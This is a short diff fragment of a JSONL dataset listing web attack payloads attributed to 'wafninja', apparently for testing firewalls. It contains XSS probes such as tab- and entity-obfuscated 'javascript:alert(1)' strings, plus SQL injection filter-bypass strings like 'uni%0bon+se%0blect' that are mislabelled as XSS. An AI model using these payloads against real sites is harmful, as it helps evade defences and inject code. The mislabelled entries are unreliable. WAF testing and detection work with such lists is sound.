+{"payload": "uni%0bon+se%0blect", "attack_type": "XSS", "source": "wafninja"}
+{"payload": " union distinct select ", "attack_type": "XSS", "source": "wafninja"}
+{"payload": " uniOn distiNct sElect ", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<!--", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "alert(1)", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<img src=x>test</img>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<img dynsrc></img>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<img lowsrc></img>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BR SIZE=\"&{alert(1)}\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "jav\tascript:alert(1);", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "\" &#14;  javascript:alert(1)\"", "attack_type": "XSS", "source": "wafninja"}
